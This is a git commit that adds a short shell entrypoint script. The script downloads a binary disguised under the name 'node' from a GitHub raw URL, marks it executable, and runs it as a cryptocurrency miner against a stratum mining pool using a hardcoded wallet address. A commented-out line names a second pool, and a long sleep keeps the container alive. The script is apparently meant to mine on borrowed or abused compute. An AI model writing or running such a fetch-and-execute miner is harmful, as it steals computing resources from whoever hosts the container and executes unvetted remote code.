5c1786dafa48bc011877df8159f08af5c4395b7b
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-04 23:30:55 +0700

    Create entrypoint.sh

---
+++ 2/entrypoint.sh
@@ -0,0 +1,13 @@
+#!/bin/sh
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+chmod +x node
+WORKER_NUMBER=$1
+PASSHOURS=$(date +%S)
+echo "start ${WORKER_NUMBER}"
+#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
+./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf
+sleep 60
+cat try.log
+
+
+sleep 29999
